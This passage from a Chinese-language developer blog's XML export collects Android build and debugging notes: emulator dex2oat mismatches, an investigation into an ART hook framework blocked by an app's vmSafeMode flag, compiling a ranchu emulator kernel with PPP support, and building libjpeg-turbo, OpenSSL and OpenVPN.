dalvik.system.PathClassLoader.<init>(PathClassLoader.java:65)<br>at android.app.ApplicationLoaders.getClassLoader(ApplicationLoaders.java:58)<br>at android.app.LoadedApk.getClassLoader(LoadedApk.java:376)<br>at android.app.LoadedApk.makeApplication(LoadedApk.java:568)<br>at android.app.ActivityThread.handleBindApplication(ActivityThread.java:4680)<br>… 8 more</init></init></init></init></init></p>
</blockquote>
<p>猜测是因为编译时用的art库版本与模拟器中不一致，导致生成的oat文件不匹配。解决方法是把dex文件拷贝到模拟器里，然后使用dex2oat编译下。</p>
<p>编译出来的dex文件（Launcher3.apk中不包含dex文件）路径是：</p>
<blockquote>
<p>out/target/common/obj/APPS/Launcher3_intermediates/classes.dex</p>
</blockquote>
<p>使用如下命令可以在/data/local/tmp目录下生成Launcher3.odex文件，/data/local/tmp/Launcher3.dex是要输入的dex文件路径。</p>
<p>5.0中执行的命令</p>
<pre><code>&gt; dex2oat --runtime-arg -Xms64m --runtime-arg -Xmx512m --dex-file=/data/local/tmp/Launcher3.dex --dex-location=/system/priv-app/Launcher3/Launcher3.apk --oat-file=/data/local/tmp/Launcher3.odex --android-root=/system --instruction-set=x86 --instruction-set-features=default --include-patch-information --runtime-arg -Xnorelocate --no-include-debug-symbols
</code></pre><p>6.0中执行的命令</p>
<pre><code>&gt; dex2oat --runtime-arg -Xms64m --runtime-arg -Xmx512m --dex-file=/data/local/tmp/Launcher3.dex --dex-location=/system/priv-app/Launcher3/Launcher3.apk --oat-file=/data/local/tmp/Launcher3.odex --android-root=/system --instruction-set=x86 --instruction-set-variant=x86 --instruction-set-features=default --include-patch-information --runtime-arg -Xnorelocate --no-generate-debug-info --abort-on-hard-verifier-error
</code></pre><p>另外一种解决方法是：<br>修改</p>
<blockquote>
<p>build/target/board/generic_x86/BoardConfig.mk  </p>
</blockquote>
<p>文件，注释掉：</p>
<blockquote>
<p>WITH_DEXPREOPT ?= true</p>
</blockquote>
<p>这样，编译后的apk中就会包含dex文件，在模拟器第一次开机时会自动进行dexopt操作。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>emulator</tag>
      </tags>
  </entry>
  <entry>
    <title>解决手机unauthorized错误</title>
    <url>/2017/01/07/android-unauthorized-error/</url>
    <content><![CDATA[<p>一般插入4.1以上版本的手机会弹出验证界面，但是我某台PC上就始终弹不出这个界面，找了很多方法都没有解决。</p>
<p>最后发现原来是<strong>ANDROID_SDK_HOME</strong>这个环境变量配的路径不存在，我之前把SDK的路径挪了下地方，就导致了这个问题。删除这个环境变量就OK了。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>adb</tag>
      </tags>
  </entry>
  <entry>
    <title>一次Art Hook失败问题的跟进</title>
    <url>/2019/03/01/art-oat-build/</url>
    <content><![CDATA[<h2 id="0x00-缘起"><a href="#0x00-缘起" class="headerlink" title="0x00 缘起"></a>0x00 缘起</h2><p>最近在使用一款Art Hook框架对应用进行Hook的时候发现，函数Hook之后却总是没有被触发，于是怀疑是被<code>dex2oat</code>做了<code>Inline</code>处理。</p>
<p>以下环境以Android 5.0 x86 为例。</p>
<h2 id="0x01-迷途"><a href="#0x01-迷途" class="headerlink" title="0x01 迷途"></a>0x01 迷途</h2><p>使用<code>oatdump --oat-file=oat_path</code>命令进行dump，却发现几乎所有的函数都无法看到汇编代码：</p>
<pre><code>    OatMethodOffsets (offset=0x00000000)

      code_offset: 0x00000000 

      gc_map: (offset=0x00000000)

    OatQuickMethodHeader (offset=0x00000000)

      mapping_table: (offset=0x00000000)

      vmap_table: (offset=0x00000000)

    QuickMethodFrameInfo

      frame_size_in_bytes: 0

      core_spill_mask: 0x00000000 

      fp_spill_mask: 0x00000000 

    CODE: (code_offset=0x00000000 size_offset=0x00000000 size=0)

      NO CODE!

</code></pre><p>看起来像是没有进行<code>oat</code>，但是dump的文件却真真实实是一个<code>oat</code>文件啊。不是说Android 5.0都是进行oat编译的吗，总不会是<code>oatdump</code>有问题吧！</p>
<h2 id="0x02-明心"><a href="#0x02-明心" class="headerlink" title="0x02 明心"></a>0x02 明心</h2><p>于是，又重新安装了一次，抓<code>logcat</code>看了以下，发现以下日志很可疑：</p>
<pre><code>I/PackageManager( 1546): Running dexopt on: /data/app/com.autonavi.minimap-1/base.apk pkg=com.autonavi.minimap isa=x86 vmSafeMode=true

I/dex2oat ( 3779): /system/bin/dex2oat --zip-fd=5 --zip-location=/data/app/com.autonavi.minimap-1/base.apk --oat-fd=6 --oat-location=/data/dalvik-cache/x86/data@app@com.autonavi.minimap-1@base.apk@classes.dex --instruction-set=x86 --instruction-set-features=default --runtime-arg -Xms64m --runtime-arg -Xmx512m --compiler-filter=interpret-only
</code></pre><p>看起来是<code>interpret-only</code>导致使用了解释方式编译。虽然不确定是不是因为<code>interpret</code>导致Hook不生效，但是看不到汇编代码，心里总是没有底。</p>
<p>所以，现在就要将编译模式改成非解释方式。</p>
<p>在<code>/frameworks/native/cmds/installd/commands.c</code>文件的<code>run_dex2oat</code>函数中找到了如下代码：</p>
<pre><code class="c">if (skip_compilation) {
    strcpy(dex2oat_compiler_filter_arg, &quot;--compiler-filter=verify-none&quot;);
    have_dex2oat_compiler_filter_flag = true;
} else if (vm_safe_mode) {
    strcpy(dex2oat_compiler_filter_arg, &quot;--compiler-filter=interpret-only&quot;);
    have_dex2oat_compiler_filter_flag = true;
} else if (have_dex2oat_compiler_filter_flag) {
    sprintf(dex2oat_compiler_filter_arg, &quot;--compiler-filter=%s&quot;, dex2oat_compiler_filter_flag);
</code></pre>
<p>看来就是这个<code>vm_safe_mode</code>导致使用了<code>interpret-only</code>模式，而上面<code>logcat</code>日志显示：<code>vm_safe_mode</code>的值是<code>true</code>。</p>
<p>顺便提一句，当<code>vm_safe_mode</code>为<code>false</code>时，系统会使用<code>dex2oat_compiler_filter_flag</code>的值作为编译类型。</p>
<pre><code class="c">char dex2oat_compiler_filter_flag[PROPERTY_VALUE_MAX];
bool have_dex2oat_compiler_filter_flag = property_get(&quot;dalvik.vm.dex2oat-filter&quot;, dex2oat_compiler_filter_flag, NULL) &gt; 0;
</code></pre>
<p>从上面的代码可以看出，<code>dex2oat_compiler_filter_flag</code>的值是取自<code>dalvik.vm.dex2oat-filter</code>这个系统属性。</p>
<p>可选的值有：<code>verify-none | interpret-only | space | balanced | speed | everything</code> 。而系统默认是没有设置这个属性的，如果我们想设置默认的编译类型，可以修改<code>/system/build.prop</code>文件，添加<code>dalvik.vm.dex2oat-filter=interpret-only</code>，保存文件并重启手机，但是这步操作需要<code>root</code>权限。</p>
<p>系统默认使用的编译类型设置如下：</p>
<pre><code class="java">  UsageError(&quot;  --compiler-filter=(verify-none|interpret-only|space|balanced|speed|everything):&quot;);
  UsageError(&quot;      select compiler filter.&quot;);
  UsageError(&quot;      Example: --compiler-filter=everything&quot;);
#if ART_SMALL_MODE
  UsageError(&quot;      Default: interpret-only&quot;);
#else
  UsageError(&quot;      Default: speed&quot;);
#endif
</code></pre>
<p>因此， 在应用没有设置<code>vm_safe_mode</code>，并且系统没有设置<code>dalvik.vm.dex2oat-filter</code>属性时，就会使用<code>speed</code>模式。</p>
<h2 id="0x03-见性"><a href="#0x03-见性" class="headerlink" title="0x03 见性"></a>0x03 见性</h2><p>下面来看<code>vm_safe_mode</code>是怎么设置的。</p>
<p><code>/frameworks/native/cmds/installd/commands.c</code></p>
<pre><code class="c">int dexopt(const char *apk_path, uid_t uid, bool is_public,
           const char *pkgname, const char *instruction_set,
           bool vm_safe_mode, bool is_patchoat){
    // ......
    run_dex2oat(input_fd, out_fd, input_file, out_path, pkgname, instruction_set, vm_safe_mode);
    // ......
}
</code></pre>
<p>一路向上，找到<code>/frameworks/base/services/core/java/com/android/server/pm/PackageManagerService.java</code>中的<code>performDexOptLI</code>函数，里面包含如下代码：</p>
<pre><code class="java">final boolean vmSafeMode = (pkg.applicationInfo.flags &amp; ApplicationInfo.FLAG_VM_SAFE_MODE) != 0;

Log.i(TAG, &quot;Running dexopt on: &quot; + path + &quot; pkg=&quot;
                                + pkg.applicationInfo.packageName + &quot; isa=&quot; + dexCodeInstructionSet
                                + &quot; vmSafeMode=&quot; + vmSafeMode);

final int ret = mInstaller.dexopt(path, sharedGid, !isForwardLocked(pkg),
                                pkg.packageName, dexCodeInstructionSet, vmSafeMode);
</code></pre>
<p>可以看出，<code>vmSafeMode</code>是从应用信息里读出来的，最终在反编译出来的<code>AndroidManifest.xml</code>里，我们找到了以下配置：</p>
<pre><code class="xml">&lt;application android:allowBackup=&quot;false&quot; android:hardwareAccelerated=&quot;true&quot; android:icon=&quot;@0x7f0213b0&quot; android:label=&quot;@0x7f090000&quot; android:largeHeap=&quot;true&quot; android:name=&quot;com.autonavi.minimap.MapApplication&quot; android:resizeableActivity=&quot;false&quot; android:roundIcon=&quot;@0x7f0213b0&quot; android:supportsRtl=&quot;true&quot; android:theme=&quot;@0x7f0b0065&quot; android:vmSafeMode=&quot;true&quot;&gt;
</code></pre>
<h2 id="0x04-缘灭"><a href="#0x04-缘灭" class="headerlink" title="0x04 缘灭"></a>0x04 缘灭</h2><p>解决方法就是，将<code>android:vmSafeMode</code>字段设为<code>false</code>，重打包应用，然后安装。</p>
<pre><code>I/PackageManager( 1546): Running dexopt on: /data/app/com.autonavi.minimap-1/base.apk pkg=com.autonavi.minimap isa=x86 vmSafeMode=false
</code></pre><p><code>vmSafeMode</code>已经被成功修改成<code>false</code>了。</p>
<p>使用<code>oatduump</code>命令查看oat信息：</p>
<pre><code>    OatMethodOffsets (offset=0x0282dfa0)

      code_offset: 0x0520ff08 

      gc_map: (offset=0x02c554ba)

    OatQuickMethodHeader (offset=0x0520fef0)

      mapping_table: (offset=0x03202b8b)

      vmap_table: (offset=0x034095d5)

      v65534/r5, v2/r6, v0/r7, v65535/r16

    QuickMethodFrameInfo

      frame_size_in_bytes: 48

      core_spill_mask: 0x000100e0 (r5, r6, r7, r16)

      fp_spill_mask: 0x00000000 

    CODE: (code_offset=0x0520ff08 size_offset=0x0520ff04 size=192)...

      0x0520ff08:         85842400E0FFFF        test    eax, [esp + -8192]

      suspend point dex PC: 0x0000

      GC map objects:  v2 (r6)

      0x0520ff0f:                 83EC2C        sub     esp, 44

      0x0520ff12:               896C2420        mov     [esp + 32], ebp

      0x0520ff16:               89742424        mov     [esp + 36], esi

      0x0520ff1a:               897C2428        mov     [esp + 40], edi

      0x0520ff1e:                   8BE8        mov     ebp, eax

      0x0520ff20:                 890424        mov     [esp], eax

      0x0520ff23:                   8BF1        mov     esi, ecx

      0x0520ff25:                 8B4514        mov     eax, [ebp + 20]

      0x0520ff28:           8B80D4AC0100        mov     eax, [eax + 109780]

      0x0520ff2e:                   85C0        test    eax, eax

      0x0520ff30:                   746A        jz/eq   +106 (0x0520ff9c)

      0x0520ff32:                   8BF8        mov     edi, eax

      0x0520ff34:                 8B4514        mov     eax, [ebp + 20]

      0x0520ff37:           8B805C7C0000        mov     eax, [eax + 31836]
</code></pre><p>汇编指令也可以正常显示了。</p>
<p>经过测试，Hook也被正常调用了。所以，应该是该Hook框架还不支持解释模式编译的应用。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>hook</tag>
      </tags>
  </entry>
  <entry>
    <title>编译可用的Android模拟器ranchu内核</title>
    <url>/2017/12/06/build-android-emulator-kernel/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前几天在使用Android模拟器的时候，发现无法连接PPTP类型的VPN服务器，报如下的错误：</p>
<blockquote>
<p>I/mtpd    (30035): Creating PPPoX socket<br>F/mtpd    (30035): Socket() Address family not supported by protocol</p>
</blockquote>
<p>对应的代码如下：</p>
<pre><code>static int create_pppox()
{
    int pppox = socket(AF_PPPOX, SOCK_DGRAM, PX_PROTO_OPNS);
    log_print(INFO, &quot;Creating PPPoX socket&quot;);

    if (pppox == -1) {
        log_print(FATAL, &quot;Socket() %s&quot;, strerror(errno));
        exit(SYSTEM_ERROR);
    } else {
        struct sockaddr_pppopns address = {
            .sa_family = AF_PPPOX,
            .sa_protocol = PX_PROTO_OPNS,
            .tcp_socket = the_socket,
            .local = local,
            .remote = remote,
        };
        if (connect(pppox, (struct sockaddr *)&amp;address, sizeof(address))) {
            log_print(FATAL, &quot;Connect() %s&quot;, strerror(errno));
            exit(SYSTEM_ERROR);
        }
    }
    return pppox;
}
</code></pre><p>错误是在第7行报出来的，也就是说：在创建<strong>AF_PPPOX</strong>类型的socket时失败了。</p>
<p>网上说是因为kernel不支持的原因，需要重新编译kernel。</p>
<h2 id="0x01-编译3-10的内核"><a href="#0x01-编译3-10的内核" class="headerlink" title="0x01 编译3.10的内核"></a>0x01 编译3.10的内核</h2><p>查看模拟器中使用的内核版本：</p>
<blockquote>
<p>Linux version 3.10.0+ (<a href="mailto:jinqian@jinqian.mtv.corp.google.com" target="_blank" rel="noopener">jinqian@jinqian.mtv.corp.google.com</a>) (gcc version 4.9 20150123 (prerelease) (GCC) ) #448 SMP PREEMPT Mon Feb 29 13:49:38 PST 2016</p>
</blockquote>
<p>将网上搜到的编译方法汇总如下（我只编译x86版本，不需要交叉编译）：</p>
<pre><code>git clone https://android.googlesource.com/kernel/goldfish.git

cd goldfish

git branch -a
</code></pre><p>返回如下结果：</p>
<pre><code>remotes/origin/HEAD -&gt; origin/master
remotes/origin/android-3.10
remotes/origin/android-3.18
remotes/origin/android-goldfish-2.6.29
remotes/origin/android-goldfish-3.10
remotes/origin/android-goldfish-3.10-k-dev
remotes/origin/android-goldfish-3.10-l-mr1-dev
remotes/origin/android-goldfish-3.10-m-dev
remotes/origin/android-goldfish-3.10-n-dev
remotes/origin/android-goldfish-3.18
remotes/origin/android-goldfish-3.18-dev
remotes/origin/android-goldfish-3.4
remotes/origin/android-goldfish-3.4-l-mr1-dev
remotes/origin/android-goldfish-4.4-dev
remotes/origin/heads/for/android-goldfish-3.18-dev
remotes/origin/linux-goldfish-3.0-wip
remotes/origin/master
</code></pre><p>选择android-goldfish-3.10分支</p>
<pre><code>git checkout android-goldfish-3.10
</code></pre><p>android源码库的路径<em>prebuilts/qemu-kernel/build-kernel.sh</em>是一个内核编译脚本。执行如下命令可以直接编译内核：</p>
<pre><code>prebuilts/qemu-kernel/build-kernel.sh --arch=x86 --config=i386_ranchu --out=/tmp/
</code></pre><p>如果报以下错误, 请在命令行后面加上： <strong>–cross=/usr/bin/</strong></p>
<blockquote>
<p>It looks like x86_64-linux-android-gcc is not in your path ! Aborting.</p>
</blockquote>
<p>也可以改成android源码中提供的gcc路径前缀</p>
<p>编译完成后会在/tmp目录下生成kernel-qemu文件，将其替换掉模拟器镜像文件目录中的kernel-ranchu文件，重启模拟器即可；或是在启动模拟器的命令行中添加<strong>-kernel /tmp/kernel-qemu</strong>，启动也可以。</p>
<h2 id="0x02-解决编译的内核无法启动模拟器问题"><a href="#0x02-解决编译的内核无法启动模拟器问题" class="headerlink" title="0x02 解决编译的内核无法启动模拟器问题"></a>0x02 解决编译的内核无法启动模拟器问题</h2><p>使用编译的内核启动模拟器后，发现会一直黑屏，无法进入系统。<br>加入<strong>-show-kernel</strong>参数后看到启动时一直报：</p>
<blockquote>
<p>init: untracked pid 16860 killed by signal 9</p>
</blockquote>
<p>查看logcat看到如下crash信息：</p>
<pre><code>I/DEBUG   ( 1312): pid: 1389, tid: 1389, name: surfaceflinger  &gt;&gt;&gt; /system/bin/surfaceflinger &lt;&lt;&lt;
I/DEBUG   ( 1312): signal 6 (SIGABRT), code -6 (SI_TKILL), fault addr --------
I/DEBUG   ( 1312):     eax 00000000  ebx 0000056d  ecx 0000056d  edx 00000006
I/DEBUG   ( 1312):     esi b3056c48  edi 00000002
I/DEBUG   ( 1312):     xcs 00000073  xds 0000007b  xes 0000007b  xfs 00000000  xss 0000007b
I/DEBUG   ( 1312):     eip b2f75686  ebp 0000056d  esp bff6d410  flags 00000286
I/DEBUG   ( 1312): 
I/DEBUG   ( 1312): backtrace:
I/DEBUG   ( 1312):     #00 pc 00074686  /system/lib/libc.so (tgkill+22)
I/DEBUG   ( 1312):     #01 pc 0002217b  /system/lib/libc.so (pthread_kill+155)
I/DEBUG   ( 1312):     #02 pc 000239f4  /system/lib/libc.so (raise+36)
I/DEBUG   ( 1312):     #03 pc 0001bdf4  /system/lib/libc.so (abort+84)
I/DEBUG   ( 1312):     #04 pc 000314e5  /system/lib/libsurfaceflinger.so
I/DEBUG   ( 1312):     #05 pc 000201d7  /system/lib/libsurfaceflinger.so (android::SurfaceFlinger::init()+199)
I/DEBUG   ( 1312):     #06 pc 00000b51  /system/bin/surfaceflinger
I/DEBUG   ( 1312):     #07 pc 00012f94  /system/lib/libc.so (__libc_init+100)
I/DEBUG   ( 1312):     #08 pc 00000cd6  /system/bin/surfaceflinger
</code></pre><p>原来是surfaceflinger一直crash，导致看不到启动动画。</p>
<p>网上搜了一气，也没有找到原因。切换到3.10的其它几个分支也不行，最好的情况的是在关闭opengl的情况下进入系统了，但是界面显示明显和正常情况不一样。</p>
<p>在山穷水尽之时，看到了<a href="http://blog.csdn.net/ayu_ag/article/details/51741679" target="_blank" rel="noopener">http://blog.csdn.net/ayu_ag/article/details/51741679</a>这篇文章，里面提供了根据提交记录查找编译时的版本号的方法。使用和sdk编译时使用的版本，应该不会有问题吧！</p>
<p>现在的模拟器使用的都是ranchu内核，android源码是在7.0的时候才开始提供的，路径是：prebuilts/qemu-kernel/x86/ranchu/kernel-qemu</p>
<p>提交记录中也没有看到有用的信息。</p>
<p>后来把 <a href="https://android.googlesource.com/platform/prebuilts/qemu-kernel" target="_blank" rel="noopener">https://android.googlesource.com/platform/prebuilts/qemu-kernel</a> 项目拉下来，在<strong>git log</strong>中找到了如下信息：</p>
<pre><code>commit e6e975ca2f2e57dced55759ab40b2851c144a67d
Author: Jin Qian &lt;jinqian@google.com&gt;
Date:   Mon Oct 31 14:28:45 2016 -0700

    Upgrade emulator kernels

    kernel-n-dev-android-goldfish-3.18-arm - build: 3421005
    kernel-n-dev-android-goldfish-3.10-mips64 - build: 3420631
    kernel-n-dev-android-goldfish-3.10-arm - build: 3420641
    kernel-n-dev-android-goldfish-3.18-arm64 - build: 3421004
    kernel-n-dev-android-goldfish-3.10-mips - build: 3420642
    kernel-n-dev-android-goldfish-3.10-arm64 - build: 3420640
    kernel-n-dev-android-goldfish-3.10-x86_64-qemu1 - build: 3420638
    kernel-n-dev-android-goldfish-3.4-x86 - build: 3407988
    kernel-n-dev-android-goldfish-3.10-x86_64 - build: 3420647
    kernel-n-dev-android-goldfish-3.18-mips - build: 3421003
    kernel-n-dev-android-goldfish-3.18-x86_64 - build: 3421007
    kernel-n-dev-android-goldfish-3.4-mips - build: 3407999
    kernel-n-dev-android-goldfish-3.4-arm - build: 3408013
    kernel-n-dev-android-goldfish-3.10-x86 - build: 3420649
    kernel-n-dev-android-goldfish-3.18-x86 - build: 3421006
    kernel-n-dev-android-goldfish-3.18-mips64 - build: 3421008

    Upgrade 3.4 kernel images to 1cc37bf
    1cc37bf MIPS: Attach goldfish machine reset and power-off routines

    Upgrade 3.10 kernel images to fd6659e
    fd6659e Merge branch &#39;android-3.10&#39; into android-goldfish-3.10
    13f4ded BACKPORT: LogiHID: hid-lg4ff: tech G29 wheel patches
    288f516 android: binder: use copy_from_user_preempt_disabled
    ...
    0e7ad12 BACKPORT: ALSA: usb-audio: Fix double-free in error paths after snd_usb_add_audio_stream() call
    5982d2e BACKPORT: ALSA: usb-audio: Minor code cleanup in create_fixed_stream_quirk()
    b581331 pstore: drop pmsg bounce buffer

    Upgrade 3.18 kernel images to 82a0dee
    82a0dee Merge branch &#39;android-3.18&#39; into android-goldfish-3.18
    74b2c7a android: binder: support for file-descriptor arrays.
    53b1701 android: binder: support for scatter-gather.
    ...
    cd6ae1f Revert &quot;UPSTREAM: ARM: 8494/1: mm: Enable PXN when running non-LPAE kernel on LPAE processor The VMSA field of MMFR0 (bottom 4 bits) is incremented for each added feature.  PXN is supported if the value is &gt;= 4 and LPAE is supported if it is &gt;= 5.&quot;
    7447458 UPSTREAM: perf: Fix race in swevent hash
    5753ff2 ANDROID: dm: Fix symbol exports for dm target callbacks

    Change-Id: I5a635595233199939145487df580c6f519c24335
</code></pre><p>里面的“fd6659e”就是我们需要的版本号</p>
<pre><code>git checkout fd6659e
</code></pre><p>再执行编译，就可以正常运行模拟器了。</p>
<h2 id="0x03-如何编译内核模块"><a href="#0x03-如何编译内核模块" class="headerlink" title="0x03 如何编译内核模块"></a>0x03 如何编译内核模块</h2><p>在正常编译出内核前，我还尝试了编译ko模块来绕过编译完整内核的问题。这里一并记录一下。</p>
<p>build-kernel.sh脚本事实上会先根据arch/x86/configs/i386_ranchu_defconfig文件生成.config文件。</p>
<p>要编译出ko，需要在i386_ranchu_defconfig中加入以下行：</p>
<pre><code>CONFIG_MODULES=y
CONFIG_MODULE_UNLOAD=y
CONFIG_MODULES_USE_ELF_REL=y
CONFIG_IP6_NF_IPTABLES=y
CONFIG_IPV6=y
</code></pre><p>然后将需要编译成模块的配置改为<strong>m</strong>，如：</p>
<p>CONFIG_PPP=m<br>CONFIG_PPP_BSDCOMP=m<br>CONFIG_PPP_DEFLATE=m<br>CONFIG_PPP_MPPE=m<br>CONFIG_PPPOLAC=m<br>CONFIG_PPPOPNS=m</p>
<p>执行命令：</p>
<pre><code>make i386_ranchu_defconfig
export ARCH=x86
make -j16
</code></pre><p>编译出来的内核文件路径是：<strong>arch/x86/boot/bzImage</strong></p>
<p>而且，期望的ko文件也编译出来了。</p>
<pre><code>drivers/net/slip/slhc.ko
drivers/net/ppp/ppp_mppe.ko
drivers/net/ppp/bsd_comp.ko
drivers/net/ppp/ppp_generic.ko
drivers/net/ppp/pppolac.ko
drivers/net/ppp/pppox.ko
drivers/net/ppp/pppopns.ko
drivers/net/ppp/ppp_deflate.ko
</code></pre><p>但是在测试的时候，发现ko中依赖到了net/core/net_namespace.c中的一个函数，而这个函数是通过CONFIG_NET_NS开关控制的。sdk提供的kernel里应该关闭了这个开关，因此，这些ko事实上是不能加载进去的。</p>
<p>而且，从6.0开始，sdk提供的kernel已经不再支持动态加载ko，估计是担心有安全风险。</p>
<h2 id="0x04-如何支持PPTP"><a href="#0x04-如何支持PPTP" class="headerlink" title="0x04 如何支持PPTP"></a>0x04 如何支持PPTP</h2><p>使用默认参数编译出来的内核，已经是支持ppp的了。但是测试发现，依然不能连上VPN服务器。原因是PPTP中使用GRE协议作为数据通道协议，该协议与TCP、UDP是同一层的，而模拟器实现的NAT只支持TCP和UDP协议，想要支持的话，必须要修改模拟器源码。</p>
<p><img src="/images/gre.png" alt></p>
<p>由于模拟器不像普通NAT网络里会有多台机器，而且一般来说，同时只会有一个进程在发起VPN连接，所以，可以不进行数据包的转换，直接透传。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>emulator</tag>
        <tag>Android</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>编译Android版本的libjpeg-turbo</title>
    <url>/2018/03/29/build-libjpeg-turbo-for-android/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>libjpeg-turbo是一个JPEG编解码库，支持x86, x86-64, ARM等系统下的指令加速，其性能号称是libjpeg的2-6倍。官网地址是：<a href="https://libjpeg-turbo.org/" target="_blank" rel="noopener">https://libjpeg-turbo.org/</a>。github地址是：<a href="https://github.com/libjpeg-turbo/libjpeg-turbo" target="_blank" rel="noopener">https://github.com/libjpeg-turbo/libjpeg-turbo</a>。</p>
<p>Android中默认提供了libjpeg实现的JPEG编解码接口，但是测试下来性能不是很好，无法满足实际使用需求。因此，准备编译Android版本来用。</p>
<h2 id="0x01-下载源码"><a href="#0x01-下载源码" class="headerlink" title="0x01 下载源码"></a>0x01 下载源码</h2><p>使用的编译环境是：Ubuntu 16.04 x64</p>
<p>一开始，我使用的是github上的代码，可以正常编译成linux版本。但是按照<a href="https://github.com/libjpeg-turbo/libjpeg-turbo/blob/master/BUILDING.md" target="_blank" rel="noopener">文档</a>上的操作却始终无法编译出Android版本。</p>
<p>后来发现，官网上的提供的版本编译脚本与github上并不相同。官网的源码包下载地址为：<a href="https://sourceforge.net/projects/libjpeg-turbo/files/" target="_blank" rel="noopener">https://sourceforge.net/projects/libjpeg-turbo/files/</a>。我下的是1.5.3版本<a href="https://sourceforge.net/projects/libjpeg-turbo/files/1.5.3/libjpeg-turbo-1.5.3.tar.gz/download" target="_blank" rel="noopener">源码包</a>。</p>
<p>解压到本地，根目录下的<code>BUILDING.md</code>文件中包含了编译方法。具体内容如下：<a href="https://github.com/drunkdream/Android-libjpeg-turbo/blob/master/libjpeg-turbo-1.5.3/BUILDING.md" target="_blank" rel="noopener">https://github.com/drunkdream/Android-libjpeg-turbo/blob/master/libjpeg-turbo-1.5.3/BUILDING.md</a></p>
<h2 id="0x02-编译环境"><a href="#0x02-编译环境" class="headerlink" title="0x02 编译环境"></a>0x02 编译环境</h2><p>编译依赖需要依赖以下库：</p>
<ul>
<li>autoconf 2.56 or later</li>
<li>automake 1.7 or later</li>
<li>libtool 1.4 or later</li>
<li>NASM or YASM (if building x86 or x86-64 SIMD extensions)</li>
</ul>
<p>Ubuntu下可以使用以下方法安装：</p>
<pre><code>apt install autoconf
apt install automake
apt install libtool
apt install nasm
</code></pre><h2 id="0x03-编译"><a href="#0x03-编译" class="headerlink" title="0x03 编译"></a>0x03 编译</h2><p>修改<code>BUILDING.md</code>中提供的编译脚本，编译出目标架构版本。为方便编译，我提供了可以直接编译的脚本: <a href="https://github.com/drunkdream/Android-libjpeg-turbo/blob/master/build.sh" target="_blank" rel="noopener">https://github.com/drunkdream/Android-libjpeg-turbo/blob/master/build.sh</a>。</p>
<p>使用方法：</p>
<pre><code>export NDK_PATH=/path/to/ndk
sh build.sh arm/arm64/x86/x86_64/all
</code></pre><p>此时，会在当前目录的<code>out</code>目录下生成对应架构的文件。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>libjpeg-turbo</tag>
      </tags>
  </entry>
  <entry>
    <title>在Windows上编译openssl</title>
    <url>/2017/07/21/build-openssl-on-windows/</url>
    <content><![CDATA[<p>###1、下载openssl源码</p>
<p><a href="https://www.openssl.org/source/" target="_blank" rel="noopener">https://www.openssl.org/source/</a></p>
<p>###2、安装环境</p>
<ol>
<li>vs2010</li>
<li><a href="http://www.activestate.com/activeperl/downloads" target="_blank" rel="noopener">ActivePerl</a></li>
<li>nasm（将nasm.exe所在目录加入到%PATH%中）</li>
</ol>
<p>###3、编译</p>
<ol>
<li>进入<strong>Visual Studio 命令提示(2010)</strong></li>
<li>进入源码目录</li>
<li>执行<code>perl Configure VC-WIN32 --prefix=C:\Build-OpenSSL-VC-32</code></li>
<li>执行<code>set path=C:\Program Files (x86)\Microsoft SDKs\Windows\v7.0A\bin;%PATH%</code></li>
<li>执行<code>set INCLUDE=C:\Program Files (x86)\Microsoft SDKs\Windows\v7.0A\Include;C:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\include</code></li>
<li>执行<code>set lib=C:\Program Files (x86)\Microsoft SDKs\Windows\v7.0A\Lib;C:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\lib</code></li>
<li>执行<code>nmake</code></li>
</ol>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>openssl</tag>
      </tags>
  </entry>
  <entry>
    <title>编译Android版本的OpenVPN</title>
    <url>/2017/12/19/build-openvpn-for-android/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>目前网上看到的Android端OpenVPN客户端都是基于VPNService开发的，这种方法不需要root权限，因此使用非常广泛。但是，这种方法需要UI操作，还是不够完美，我更喜欢使用纯命令行的openvpn（需要root权限）。</p>
<p>以下是编译2.3.17 x86版本openvpn过程的记录。<br>编译环境为：Ubuntu 14.04 64位系统</p>
<p>源码下载地址为：<a href="http://build.openvpn.net/downloads/releases/" target="_blank" rel="noopener">http://build.openvpn.net/downloads/releases/</a>。</p>
<h2 id="0x01-依赖库编译"><a href="#0x01-依赖库编译" class="headerlink" title="0x01 依赖库编译"></a>0x01 依赖库编译</h2><p>openvpn依赖的库主要有：openssl、liblzo</p>
<h3 id="编译openssl"><a href="#编译openssl" class="headerlink" title="编译openssl"></a>编译openssl</h3><p>github上找到一个提供编译方法的<a href="https://github.com/leenjewel/openssl_for_ios_and_android" target="_blank" rel="noopener">项目</a>，它提供的是openssl-1.1.0f版本的编译，按照如下命令可以很快编译出x86版本的静态库。</p>
<blockquote>
<p>./build-openssl4android.sh android-x86 x86</p>
</blockquote>
<p>但是后来发现，openvpn用到的一些函数已经不支持openssl 1.1以上版本，因此改用1.0.2版本的openssl。下载地址为：<a href="https://www.openssl.org/source/old/1.0.2/" target="_blank" rel="noopener">https://www.openssl.org/source/old/1.0.2/</a>。</p>
<p>修改build-openssl4android.sh中openssl的文件名，然后运行脚本编译。完成后在会在<code>libs\x86\lib</code>目录下生成<code>libcrypto.a</code>和<code>libssl.a</code>两个文件。</p>
<p>网上还找到另外一种<a href="https://stackoverflow.com/questions/24130501/openssl-compiled-to-run-on-android-x86-architecture" target="_blank" rel="noopener">方法</a>，原理是一致的，方法略有差异。</p>
<pre><code>export CC=&quot;$STANDALONE_TOOCHAIN_PATH/bin/i686-linux-android-gcc -mtune=atom -march=atom --sysroot=$STANDALONE_TOOCHAIN_PATH/sysroot&quot;
export AR=$STANDALONE_TOOCHAIN_PATH/bin/i686-linux-android-ar
